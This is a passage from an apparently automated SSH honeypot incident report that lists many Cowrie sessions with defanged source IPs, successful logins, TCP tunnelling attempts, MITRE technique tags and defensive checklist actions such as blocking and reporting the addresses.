- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894239a2cb28

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-08-23 15:14 |
| **Last Seen** | 2026-08-23 15:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:14:38` | `cowrie.session.connect` |
| `2026-08-23 15:14:38` | `cowrie.client.version` |
| `2026-08-23 15:14:38` | `cowrie.client.kex` |
| `2026-08-23 15:14:38` | `cowrie.login.success` |
| `2026-08-23 15:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f38f3b50eb

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-08-23 15:14 |
| **Last Seen** | 2026-08-23 15:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:14:39` | `cowrie.session.connect` |
| `2026-08-23 15:14:39` | `cowrie.client.version` |
| `2026-08-23 15:14:39` | `cowrie.client.kex` |
| `2026-08-23 15:14:39` | `cowrie.login.success` |
| `2026-08-23 15:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018acaa7234b

| Field | Detail |
|---|---|
| **Source IP** | `190.223.36[.]108` |
| **First Seen** | 2026-08-23 15:15 |
| **Last Seen** | 2026-08-23 15:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:15:26` | `cowrie.session.connect` |
| `2026-08-23 15:15:26` | `cowrie.client.version` |
| `2026-08-23 15:15:26` | `cowrie.client.kex` |
| `2026-08-23 15:15:28` | `cowrie.login.success` |
| `2026-08-23 15:15:29` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.36[.]108` to AbuseIPDB if not already reported
- [ ] Block `190.223.36[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28fc34ecf793

| Field | Detail |
|---|---|
| **Source IP** | `60.172.1[.]210` |
| **First Seen** | 2026-08-23 15:15 |
| **Last Seen** | 2026-08-23 15:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:15:35` | `cowrie.session.connect` |
| `2026-08-23 15:15:36` | `cowrie.client.version` |
| `2026-08-23 15:15:36` | `cowrie.client.kex` |
| `2026-08-23 15:15:39` | `cowrie.login.success` |
| `2026-08-23 15:15:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.1[.]210` to AbuseIPDB if not already reported
- [ ] Block `60.172.1[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccc2e1e81742

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-08-23 15:20 |
| **Last Seen** | 2026-08-23 15:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:20:05` | `cowrie.session.connect` |
| `2026-08-23 15:20:06` | `cowrie.client.version` |
| `2026-08-23 15:20:06` | `cowrie.client.kex` |
| `2026-08-23 15:20:08` | `cowrie.login.success` |
| `2026-08-23 15:20:09` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85ff9681b2e1

| Field | Detail |
|---|---|
| **Source IP** | `118.43.236[.]237` |
| **First Seen** | 2026-08-23 15:20 |
| **Last Seen** | 2026-08-23 15:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:20:14` | `cowrie.session.connect` |
| `2026-08-23 15:20:15` | `cowrie.client.version` |
| `2026-08-23 15:20:15` | `cowrie.client.kex` |
| `2026-08-23 15:20:17` | `cowrie.login.success` |
| `2026-08-23 15:20:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.43.236[.]237` to AbuseIPDB if not already reported
- [ ] Block `118.43.236[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bad94069f0d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:21 |
| **Last Seen** | 2026-08-23 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:21:33` | `cowrie.session.connect` |
| `2026-08-23 15:21:33` | `cowrie.client.version` |
| `2026-08-23 15:21:34` | `cowrie.client.kex` |
| `2026-08-23 15:21:35` | `cowrie.login.success` |
| `2026-08-23 15:21:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:21:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:21:35` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d9ea5f21537

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:21 |
| **Last Seen** | 2026-08-23 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:21:38` | `cowrie.session.connect` |
| `2026-08-23 15:21:38` | `cowrie.client.version` |
| `2026-08-23 15:21:38` | `cowrie.client.kex` |
| `2026-08-23 15:21:39` | `cowrie.login.success` |
| `2026-08-23 15:21:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:21:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:21:39` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95845080ff3

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-23 15:25 |
| **Last Seen** | 2026-08-23 15:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:25:01` | `cowrie.session.connect` |
| `2026-08-23 15:25:01` | `cowrie.client.version` |
| `2026-08-23 15:25:01` | `cowrie.client.kex` |
| `2026-08-23 15:25:02` | `cowrie.login.success` |
| `2026-08-23 15:25:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db25334532e5

| Field | Detail |
|---|---|
| **Source IP** | `218.202.91[.]147` |
| **First Seen** | 2026-08-23 15:25 |
| **Last Seen** | 2026-08-23 15:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:25:08` | `cowrie.session.connect` |
| `2026-08-23 15:25:09` | `cowrie.client.version` |
| `2026-08-23 15:25:09` | `cowrie.client.kex` |
| `2026-08-23 15:25:11` | `cowrie.login.success` |
| `2026-08-23 15:25:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.91[.]147` to AbuseIPDB if not already reported
- [ ] Block `218.202.91[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b78dce0b8fb3

| Field | Detail |
|---|---|
| **Source IP** | `103.59.4[.]36` |
| **First Seen** | 2026-08-23 15:30 |
| **Last Seen** | 2026-08-23 15:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:30:30` | `cowrie.session.connect` |
| `2026-08-23 15:30:31` | `cowrie.client.version` |
| `2026-08-23 15:30:31` | `cowrie.client.kex` |
| `2026-08-23 15:30:32` | `cowrie.login.success` |
| `2026-08-23 15:30:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:30:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.4[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.59.4[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f86651236347

| Field | Detail |
|---|---|
| **Source IP** | `38.199.201[.]3` |
| **First Seen** | 2026-08-23 15:30 |
| **Last Seen** | 2026-08-23 15:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:30:38` | `cowrie.session.connect` |
| `2026-08-23 15:30:39` | `cowrie.client.version` |
| `2026-08-23 15:30:39` | `cowrie.client.kex` |
| `2026-08-23 15:30:41` | `cowrie.login.success` |
| `2026-08-23 15:30:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.199.201[.]3` to AbuseIPDB if not already reported
- [ ] Block `38.199.201[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d597585996ad

| Field | Detail |
|---|---|
| **Source IP** | `99.224.131[.]187` |
| **First Seen** | 2026-08-23 15:30 |
| **Last Seen** | 2026-08-23 15:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:30:43` | `cowrie.session.connect` |
| `2026-08-23 15:30:43` | `cowrie.client.version` |
| `2026-08-23 15:30:43` | `cowrie.client.kex` |
| `2026-08-23 15:30:44` | `cowrie.login.success` |
| `2026-08-23 15:30:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `99.224.131[.]187` to AbuseIPDB if not already reported
- [ ] Block `99.224.131[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223e33677302

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-08-23 15:30 |
| **Last Seen** | 2026-08-23 15:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:30:50` | `cowrie.session.connect` |
| `2026-08-23 15:30:51` | `cowrie.client.version` |
| `2026-08-23 15:30:51` | `cowrie.client.kex` |
| `2026-08-23 15:30:54` | `cowrie.login.success` |
| `2026-08-23 15:30:55` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4064d1d9cb42

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:31 |
| **Last Seen** | 2026-08-23 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:31:02` | `cowrie.session.connect` |
| `2026-08-23 15:31:02` | `cowrie.client.version` |
| `2026-08-23 15:31:03` | `cowrie.client.kex` |
| `2026-08-23 15:31:03` | `cowrie.login.success` |
| `2026-08-23 15:31:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:31:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:31:04` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-868f0a5a7d87

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:31 |
| **Last Seen** | 2026-08-23 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:31:07` | `cowrie.session.connect` |
| `2026-08-23 15:31:07` | `cowrie.client.version` |
| `2026-08-23 15:31:07` | `cowrie.client.kex` |
| `2026-08-23 15:31:08` | `cowrie.login.success` |
| `2026-08-23 15:31:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:31:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:31:09` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e8259e009f9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:40 |
| **Last Seen** | 2026-08-23 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:40:31` | `cowrie.session.connect` |
| `2026-08-23 15:40:31` | `cowrie.client.version` |
| `2026-08-23 15:40:31` | `cowrie.client.kex` |
| `2026-08-23 15:40:32` | `cowrie.login.success` |
| `2026-08-23 15:40:32` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:40:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:40:32` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81f425ec69d4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:40 |
| **Last Seen** | 2026-08-23 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:40:34` | `cowrie.session.connect` |
| `2026-08-23 15:40:34` | `cowrie.client.version` |
| `2026-08-23 15:40:35` | `cowrie.client.kex` |
| `2026-08-23 15:40:35` | `cowrie.login.success` |
| `2026-08-23 15:40:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:40:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:40:36` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91d87aad989c

| Field | Detail |
|---|---|
| **Source IP** | `91.146.167[.]76` |
| **First Seen** | 2026-08-23 15:47 |
| **Last Seen** | 2026-08-23 15:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:47:50` | `cowrie.session.connect` |
| `2026-08-23 15:47:51` | `cowrie.client.version` |
| `2026-08-23 15:47:51` | `cowrie.client.kex` |
| `2026-08-23 15:47:52` | `cowrie.login.success` |
| `2026-08-23 15:47:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.146.167[.]76` to AbuseIPDB if not already reported
- [ ] Block `91.146.167[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6db5f67ac0

| Field | Detail |
|---|---|
| **Source IP** | `203.188.242[.]10` |
| **First Seen** | 2026-08-23 15:47 |
| **Last Seen** | 2026-08-23 15:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:47:57` | `cowrie.session.connect` |
| `2026-08-23 15:47:58` | `cowrie.client.version` |
| `2026-08-23 15:47:58` | `cowrie.client.kex` |
| `2026-08-23 15:48:00` | `cowrie.login.success` |
| `2026-08-23 15:48:01` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.188.242[.]10` to AbuseIPDB if not already reported
- [ ] Block `203.188.242[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff137bcb18ed

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:49 |
| **Last Seen** | 2026-08-23 15:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:49:57` | `cowrie.session.connect` |
| `2026-08-23 15:49:57` | `cowrie.client.version` |
| `2026-08-23 15:49:57` | `cowrie.client.kex` |
| `2026-08-23 15:49:58` | `cowrie.login.success` |
| `2026-08-23 15:49:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:49:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:49:58` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98e52a8ef394

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:50 |
| **Last Seen** | 2026-08-23 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:50:00` | `cowrie.session.connect` |
| `2026-08-23 15:50:00` | `cowrie.client.version` |
| `2026-08-23 15:50:01` | `cowrie.client.kex` |
| `2026-08-23 15:50:01` | `cowrie.login.success` |
| `2026-08-23 15:50:02` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:50:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:50:02` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95de555afdff

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-08-23 15:52 |
| **Last Seen** | 2026-08-23 15:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:52:32` | `cowrie.session.connect` |
| `2026-08-23 15:52:32` | `cowrie.client.version` |
| `2026-08-23 15:52:32` | `cowrie.client.kex` |
| `2026-08-23 15:52:35` | `cowrie.login.success` |
| `2026-08-23 15:52:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c746bf13d41

| Field | Detail |
|---|---|
| **Source IP** | `194.59.245[.]3` |
| **First Seen** | 2026-08-23 15:52 |
| **Last Seen** | 2026-08-23 15:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:52:42` | `cowrie.session.connect` |
| `2026-08-23 15:52:42` | `cowrie.client.version` |
| `2026-08-23 15:52:42` | `cowrie.client.kex` |
| `2026-08-23 15:52:43` | `cowrie.login.success` |
| `2026-08-23 15:52:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.59.245[.]3` to AbuseIPDB if not already reported
- [ ] Block `194.59.245[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ec231bda4b

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-08-23 15:53 |
| **Last Seen** | 2026-08-23 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:53:59` | `cowrie.session.connect` |
| `2026-08-23 15:53:59` | `cowrie.client.version` |
| `2026-08-23 15:53:59` | `cowrie.client.kex` |
| `2026-08-23 15:54:00` | `cowrie.login.success` |
| `2026-08-23 15:54:00` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:54:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:54:00` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:54:00` | `cowrie.session.closed` |

